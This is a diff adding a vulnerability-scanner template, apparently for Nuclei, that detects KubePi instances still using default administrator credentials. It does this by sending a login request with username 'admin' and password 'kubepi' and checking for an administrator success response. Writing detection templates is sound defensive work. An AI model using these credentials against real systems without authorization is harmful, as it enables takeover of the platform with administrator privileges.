@@ -1,0 +1,29 @@
+id: kubepi-default-password
+info:
+  name: KubePi Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    KubePi has a default password vulnerability, which allows attackers to control the entire platform through the default JWT user and operate core functions with administrator privileges.
+  tags: default-password
+  classification:
+    cvss-score: 7.8
+http:
+  - raw:
+      - |
+        POST /kubepi/api/v1/sessions HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"admin","password":"kubepi"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "data"
+          - "\"isAdministrator\": true"
+          - "\"success\": true"
